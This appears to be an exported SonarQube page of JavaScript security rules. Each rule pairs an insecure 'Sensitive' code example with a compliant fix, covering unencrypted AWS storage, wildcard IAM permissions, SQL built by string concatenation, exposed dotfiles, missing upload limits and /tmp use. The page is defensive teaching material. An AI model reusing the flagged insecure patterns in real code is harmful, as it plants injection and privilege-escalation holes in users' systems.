import { aws_rds as rds } from 'aws-cdk-lib';

declare const sourceInstance: rds.DatabaseInstance;

new rds.DatabaseInstanceReadReplica(this, 'example', {
  sourceDatabaseInstance: sourceInstance,
  instanceType: ec2.InstanceType.of(ec2.InstanceClass.BURSTABLE2, ec2.InstanceSize.LARGE),
  vpc,
  storageEncrypted: false, // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html"><code>aws-cdk-lib.aws_rds.CfnDBCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

new rds.CfnDBCluster(this, 'example', {
  storageEncrypted: true,
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html"><code>aws-cdk-lib.aws_rds.CfnDBInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

new rds.CfnDBInstance(this, 'example', {
  storageEncrypted: true,
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html"><code>aws-cdk-lib.aws_rds.DatabaseCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const vpc: ec2.Vpc;

const cluster = new rds.DatabaseCluster(this, 'example', {
  engine: rds.DatabaseClusterEngine.auroraMysql({ version: rds.AuroraMysqlEngineVersion.VER_2_08_1 }),
  instanceProps: {
    vpcSubnets: {
      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,
    },
    vpc,
  },
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot.html"><code>aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const vpc: ec2.Vpc;

new rds.DatabaseClusterFromSnapshot(this, 'example', {
  engine: rds.DatabaseClusterEngine.aurora({ version: rds.AuroraEngineVersion.VER_1_22_2 }),
  instanceProps: {
    vpc,
  },
  snapshotIdentifier: 'exampleSnapshot',
  storageEncrypted: true,
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html"><code>aws-cdk-lib.aws_rds.DatabaseInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const vpc: ec2.Vpc;

new rds.DatabaseInstance(this, 'example', {
  engine: rds.DatabaseInstanceEngine.POSTGRES,
  vpc,
  storageEncrypted: true,
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica.html"><code>aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const sourceInstance: rds.DatabaseInstance;

new rds.DatabaseInstanceReadReplica(this, 'example', {
  sourceDatabaseInstance: sourceInstance,
  instanceType: ec2.InstanceType.of(ec2.InstanceClass.BURSTABLE2, ec2.InstanceSize.LARGE),
  vpc,
  storageEncrypted: true,
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html">AWS Documentation</a> - Encrypting Amazon RDS
  resources </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6302">
              javascript:S6302
            </a>
          </td>
          <td>
            <details>
              <p>A policy that grants all permissions may indicate an improper access control, which violates <a
href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a>. Suppose an identity is granted full
permissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources
may occur and therefore result in loss of information.</p>
<h2>Ask Yourself Whether</h2>
<p>Identities obtaining all the permissions:</p>
<ul>
  <li> only require a subset of these permissions to perform the intended function. </li>
  <li> have monitored activity showing that only a subset of these permissions is actually used. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start
with the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in
production, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>
<h2>Sensitive Code Example</h2>
<p>A customer-managed policy that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>
<pre>
import { aws_iam as iam } from 'aws-cdk-lib'

new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: ["*"], // Sensitive
    resources: ["arn:aws:iam:::user/*"],
})
</pre>
<h2>Compliant Solution</h2>
<p>A customer-managed policy that grants only the required permissions:</p>
<pre>
import { aws_iam as iam } from 'aws-cdk-lib'

new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: ["iam:GetAccountSummary"],
    resources: ["arn:aws:iam:::user/*"],
})
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> <a href="https://cloud.google.com/iam/docs/understanding-roles">Google Cloud Documentation</a> - Understanding roles </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6308">
              javascript:S6308
            </a>
          </td>
          <td>
            <details>
              <p>Amazon OpenSearch Service is a managed service to host OpenSearch instances. It replaces Elasticsearch Service, which has been deprecated.</p>
<p>To harden domain (cluster) data in case of unauthorized access, OpenSearch provides data-at-rest encryption if the engine is OpenSearch (any
version), or Elasticsearch with a version of 5.1 or above. Enabling encryption at rest will help protect:</p>
<ul>
  <li> indices </li>
  <li> logs </li>
  <li> swap files </li>
  <li> data in the application directory </li>
  <li> automated snapshots </li>
</ul>
<p>Thus, adversaries cannot access the data if they gain physical access to the storage medium.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to encrypt OpenSearch domains that contain sensitive information.</p>
<p>OpenSearch handles encryption and decryption transparently, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.Domain.html">aws-cdk-lib.aws_opensearchservice.Domain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';

const exampleDomain = new opensearchservice.Domain(this, 'ExampleDomain', {
  version: EngineVersion.OPENSEARCH_1_3,
}); // Sensitive, encryption must be explicitly enabled
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.CfnDomain.html">aws-cdk-lib.aws_opensearchservice.CfnDomain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';

const exampleCfnDomain = new opensearchservice.CfnDomain(this, 'ExampleCfnDomain', {
  engineVersion: 'OpenSearch_1.3',
}); // Sensitive, encryption must be explicitly enabled
</pre>
<h2>Compliant Solution</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.Domain.html">aws-cdk-lib.aws_opensearchservice.Domain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';

const exampleDomain = new opensearchservice.Domain(this, 'ExampleDomain', {
  version: EngineVersion.OPENSEARCH_1_3,
  encryptionAtRest: {
    enabled: true,
  },
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.CfnDomain.html">aws-cdk-lib.aws_opensearchservice.CfnDomain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';

const exampleCfnDomain = new opensearchservice.CfnDomain(this, 'ExampleCfnDomain', {
  engineVersion: 'OpenSearch_1.3',
  encryptionAtRestOptions: {
    enabled: true,
  },
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/opensearch-service/latest/developerguide/encryption-at-rest.html">AWS Documentation</a> - Encryption of
  data at rest for Amazon OpenSearch Service </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5691">
              javascript:S5691
            </a>
          </td>
          <td>
            <details>
              <p>Hidden files are created automatically by many tools to save user-preferences, well-known examples are <code>.profile</code>, <code>.bashrc</code>,
<code>.bash_history</code> or .<code>git</code>. To simplify the view these files are not displayed by default using operating system commands like
<code>ls</code>.</p>
<p>Outside of the user environment, hidden files are sensitive because they are used to store privacy-related information or even hard-coded
secrets.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Hidden files may have been inadvertently uploaded to the static server’s public directory and it accepts requests to hidden files. </li>
  <li> There is no business use cases linked to serve files in <code>.name</code> format but the server is not configured to reject requests to this
  type of files. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Disable the serving of hidden files. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/serve-static">Express.js serve-static</a> middleware:</p>
<pre>
let serveStatic = require("serve-static");
let app = express();
let serveStaticMiddleware = serveStatic('public', { 'index': false, 'dotfiles': 'allow'});   // Sensitive
app.use(serveStaticMiddleware);
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/serve-static">Express.js serve-static</a> middleware:</p>
<pre>
let serveStatic = require("serve-static");
let app = express();
let serveStaticMiddleware = serveStatic('public', { 'index': false, 'dotfiles': 'ignore'});   // Compliant: ignore or deny are recommended values
let serveStaticDefault = serveStatic('public', { 'index': false});   // Compliant: by default, "dotfiles" (file or directory that begins with a dot) are not served (with the exception that files within a directory that begins with a dot are not ignored), see serve-static module documentation
app.use(serveStaticMiddleware);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://github.com/mtojek/go-url-fuzzer">github.com/mtojek/go-url-fuzzer</a> - Discover hidden files and directories on a web server.
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/538">CWE-538 - File and Directory Information Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5693">
              javascript:S5693
            </a>
          </td>
          <td>
            <details>
              <p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevent DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> size limits are not defined for the different resources of the web application. </li>
  <li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting">rate limiting</a> features. </li>
  <li> the web application infrastructure has limited resources. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul>
      <li> lower or equal to 8mb for file uploads. </li>
      <li> lower or equal to 2mb for other requests. </li>
    </ul>  </li>
</ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/formidable">formidable</a> file upload module:</p>
<pre>
const form = new Formidable();
form.maxFileSize = 10000000; // Sensitive: 10MB is more than the recommended limit of 8MB

const formDefault = new Formidable(); // Sensitive, the default value is 200MB
</pre>
<p><a href="https://www.npmjs.com/package/multer">multer</a> (Express.js middleware) file upload module:</p>
<pre>
let diskUpload = multer({
  storage: diskStorage,
  limits: {
    fileSize: 10000000; // Sensitive: 10MB is more than the recommended limit of 8MB
  }
});

let diskUploadUnlimited = multer({ // Sensitive: the default value is no limit
  storage: diskStorage,
});
</pre>
<p><a href="https://www.npmjs.com/package/body-parser">body-parser</a> module:</p>
<pre>
// 4MB is more than the recommended limit of 2MB for non-file-upload requests
let jsonParser = bodyParser.json({ limit: "4mb" }); // Sensitive
let urlencodedParser = bodyParser.urlencoded({ extended: false, limit: "4mb" }); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/formidable">formidable</a> file upload module:</p>
<pre>
const form = new Formidable();
form.maxFileSize = 8000000; // Compliant: 8MB
</pre>
<p><a href="https://www.npmjs.com/package/multer">multer</a> (Express.js middleware) file upload module:</p>
<pre>
let diskUpload = multer({
  storage: diskStorage,
  limits: {
     fileSize: 8000000 // Compliant: 8MB
  }
});
</pre>
<p><a href="https://www.npmjs.com/package/body-parser">body-parser</a> module:</p>
<pre>
let jsonParser = bodyParser.json(); // Compliant, when the limit is not defined, the default value is set to 100kb
let urlencodedParser = bodyParser.urlencoded({ extended: false, limit: "2mb" }); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/770">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6317">
              javascript:S6317
            </a>
          </td>
          <td>
            <details>
              <p>Within IAM, identity-based policies grant permissions to users, groups, or roles, and enable specific actions to be performed on designated
resources. When an identity policy inadvertently grants more privileges than intended, certain users or roles might be able to perform more actions
than expected. This can lead to potential security risks, as it enables malicious users to escalate their privileges from a lower level to a higher
level of access.</p>
<h2>Why is this an issue?</h2>
<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy
which, when attached to an identity or a resource, defines its permissions. Policies granting permission to an identity (a user, a group or a role)
are called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>
<p>For such policies, it is easy to define very broad permissions (by using wildcard <code>"*"</code> permissions for example.) This is especially
true if it is not yet clear which permissions will be required for a specific workload or use case. However, it is important to limit the amount of
permissions that are granted and the amount of resources to which these permissions are granted. Doing so ensures that there are no users or roles
that have more permissions than they need.</p>
<p>If this is not done, it can potentially carry security risks in the case that an attacker gets access to one of these identities.</p>
<h3>What is the potential impact?</h3>
<p>AWS IAM policies that contain overly broad permissions can lead to privilege escalation by granting users more access than necessary. They may be
able to perform actions beyond their intended scope.</p>
<h4>Privilege escalation</h4>
<p>When IAM policies are too permissive, they grant users more privileges than necessary, allowing them to perform actions that they should not be
able to. This can be exploited by attackers to gain unauthorized access to sensitive resources and perform malicious activities.</p>
<p>For example, if an IAM policy grants a user unrestricted access to all S3 buckets in an AWS account, the user can potentially read, write, and
delete any object within those buckets. If an attacker gains access to this user’s credentials, they can exploit this overly permissive policy to
exfiltrate sensitive data, modify or delete critical files, or even launch further attacks within the AWS environment. This can have severe
consequences, such as data breaches, service disruptions, or unauthorized access to other resources within the AWS account.</p>
<h2>How to fix it in AWS CDK</h2>
<h3>Code examples</h3>
<p>In this example, the IAM policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by
altering the code of a Lambda that executes with high privileges.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import { aws_iam as iam } from 'aws-cdk-lib'

new iam.PolicyDocument({
    statements: [new iam.PolicyStatement({
        effect: iam.Effect.ALLOW,
        actions: ["lambda:UpdateFunctionCode"],
        resources: ["*"], // Noncompliant
    })],
});
</pre>
<h4>Compliant solution</h4>
<p>The policy is narrowed such that only updates to the code of certain Lambda functions (without high privileges) are allowed.</p>
<pre data-diff-id="1" data-diff-type="compliant">
import { aws_iam as iam } from 'aws-cdk-lib'

new iam.PolicyDocument({
    statements: [new iam.PolicyStatement({
        effect: iam.Effect.ALLOW,
        actions: ["lambda:UpdateFunctionCode"],
        resources: ["arn:aws:lambda:us-east-2:123456789012:function:my-function:1"],
    })],
});
</pre>
<h3>How does this work?</h3>
<h4>Principle of least privilege</h4>
<p>When creating IAM policies, it is important to adhere to the principle of least privilege. This means that any user or role should only be granted
enough permissions to perform the tasks that they are supposed to, and <em>nothing else</em>.</p>
<p>To successfully implement this, it is easier to start from nothing and gradually build up all the needed permissions. When starting from a policy
with overly broad permissions which is made stricter at a later time, it can be harder to ensure that there are no gaps that might be forgotten about.
In this case, it might be useful to monitor the users or roles to verify which permissions are used.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> AWS Documentation - <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#grant-least-priv">Policies and permissions
  in IAM: Grant least privilege</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Rhino Security Labs - <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/">AWS IAM Privilege Escalation -
  Methods and Mitigation</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-269 - Improper Privilege Management</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2077">
              javascript:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href='/organizations/sopra-steria/rules?open=javascript%3AS3649&rule_key=javascript%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted
queries.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Some parts of the query come from untrusted values (like user inputs). </li>
  <li> The query is repeated/duplicated in other parts of the code. </li>
  <li> The application must support different types of relational databases. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>
  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
// === MySQL ===
const mysql = require('mysql');
const mycon = mysql.createConnection({ host: host, user: user, password: pass, database: db });
mycon.connect(function(err) {
  mycon.query('SELECT * FROM users WHERE id = ' + userinput, (err, res) =&gt; {}); // Sensitive
});

// === PostgreSQL ===
const pg = require('pg');
const pgcon = new pg.Client({ host: host, user: user, password: pass, database: db });
pgcon.connect();
pgcon.query('SELECT * FROM users WHERE id = ' + userinput, (err, res) =&gt; {}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
// === MySQL ===
const mysql = require('mysql');
const mycon = mysql.createConnection({ host: host, user: user, password: pass, database: db });
mycon.connect(function(err) {
  mycon.query('SELECT name FROM users WHERE id = ?', [userinput], (err, res) =&gt; {});
});

// === PostgreSQL ===
const pg = require('pg');
const pgcon = new pg.Client({ host: host, user: user, password: pass, database: db });
pgcon.connect();
pgcon.query('SELECT name FROM users WHERE id = $1', [userinput], (err, res) =&gt; {});
</pre>
<h2>Exceptions</h2>
<p>This rule’s current implementation does not follow variables. It will only detect SQL queries which are formatted directly in the function
call.</p>
<pre>
const sql = 'SELECT * FROM users WHERE id = ' + userinput;
mycon.query(sql, (err, res) =&gt; {}); // Sensitive but no issue is raised.
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6319">
              javascript:S6319
            </a>
          </td>
          <td>
            <details>
              <p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker
instances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries
physically access the storage media, they cannot decrypt encrypted data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The instance contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by
SageMaker, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sagemaker.CfnNotebookInstance.html"><code>aws-cdk-lib.aws-sagemaker.CfnNotebookInstance</code></a></p>
<pre>
import { CfnNotebookInstance } from 'aws-cdk-lib/aws-sagemaker';

new CfnNotebookInstance(this, 'example', {
      instanceType: 'instanceType',
      roleArn: 'roleArn'
}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sagemaker.CfnNotebookInstance.html"><code>aws-cdk-lib.aws-sagemaker.CfnNotebookInstance</code></a></p>
<pre>
import { CfnNotebookInstance } from 'aws-cdk-lib/aws-sagemaker';

const encryptionKey = new Key(this, 'example', {
    enableKeyRotation: true,
});
new CfnNotebookInstance(this, 'example', {
    instanceType: 'instanceType',
    roleArn: 'roleArn',
    kmsKeyId: encryptionKey.keyId
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html">Protect Data at Rest Using Encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5689">
              javascript:S5689
            </a>
          </td>
          <td>
            <details>
              <p>Disclosure of version information, usually overlooked by developers but disclosed by default by the systems and frameworks in use, can pose a
significant security risk depending on the production environement.</p>
<p>Once this information is public, attackers can use it to identify potential security holes or vulnerabilities specific to that version.</p>
<p>Furthermore, if the published version information indicates the use of outdated or unsupported software, it becomes easier for attackers to exploit
known vulnerabilities. They can search for published vulnerabilities related to that version and launch attacks that specifically target those
vulnerabilities.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Version information is accessible to end users. </li>
  <li> Internal systems do not benefit from timely patch management workflows. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, it is recommended to keep internal technical information within internal systems to control what attackers know about the underlying
architectures. This is known as the "need to know" principle.</p>
<p>The most effective solution is to remove version information disclosure from what end users can see, such as the "x-powered-by" header.<br> This
can be achieved directly through the web application code, server (nginx, apache) or firewalls.</p>
<p>Disabling the server signature provides additional protection by reducing the amount of information available to attackers. Note, however, that
this does not provide as much protection as regular updates and patches.<br> Security by obscurity is the least foolproof solution of all. It should
never be the only defense mechanism and should always be combined with other security measures.</p>
<h2>Sensitive Code Example</h2>
<p>In <a href="https://www.npmjs.com/package/express">Express.js</a>, version information is disclosed by default in the <code>x-powered-by</code>
HTTP header:</p>
<pre>
let express = require('express');

let example = express(); // Sensitive

example.get('/', function (req, res) {
  res.send('example')
});
</pre>
<h2>Compliant Solution</h2>
<p><code>x-powered-by</code> HTTP header should be disabled in <a href="https://www.npmjs.com/package/express">Express.js</a> with
<code>app.disable</code>:</p>
<pre>
let express = require('express');

let example = express();
example.disable("x-powered-by");
</pre>
<p>Or with helmet’s <a href="https://www.npmjs.com/package/helmet">hidePoweredBy</a> middleware:</p>
<pre>
let helmet = require("helmet");

let example = express();
example.use(helmet.hidePoweredBy());
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html">OWASP Testing Guide - OTG-INFO-008</a> - Fingerprint Web Application Framework </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Information Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5443">
              javascript:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451">CVE-2012-2451</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838">CVE-2015-1838</a> </li>
</ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul>
  <li> <code>/tmp</code> </li>
  <li> <code>/var/tmp</code> </li>
  <li> <code>/usr/tmp</code> </li>
  <li> <code>/dev/shm</code> </li>
  <li> <code>/dev/mqueue</code> </li>
  <li> <code>/run/lock</code> </li>
  <li> <code>/var/run/lock</code> </li>
  <li> <code>/Library/Caches</code> </li>
  <li> <code>/Users/Shared</code> </li>
  <li> <code>/private/tmp</code> </li>
  <li> <code>/private/var/tmp</code> </li>
  <li> <code>\Windows\Temp</code> </li>
  <li> <code>\Temp</code> </li>
  <li> <code>\TMP</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Files are read from or written into a publicly writable folder </li>
  <li> The application creates files with predictable names into a publicly writable folder </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a dedicated sub-folder with tightly controlled permissions </li>
  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul>
      <li> The generated filename is unpredictable </li>
      <li> The file is readable and writable only by the creating user ID </li>
      <li> The file descriptor is not inherited by child processes </li>
      <li> The file will be destroyed as soon as it is closed </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
const fs = require('fs');

let tmp_file = "/tmp/temporary_file"; // Sensitive
fs.readFile(tmp_file, 'utf8', function (err, data) {
  // ...
});
</pre>
<pre>
const fs = require('fs');

let tmp_dir = process.env.TMPDIR; // Sensitive
fs.readFile(tmp_dir + "/temporary_file", 'utf8', function (err, data) {
  // ...
});
</pre>
<h2>Compliant Solution</h2>
<pre>
const tmp = require('tmp');

const tmpobj = tmp.fileSync(); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
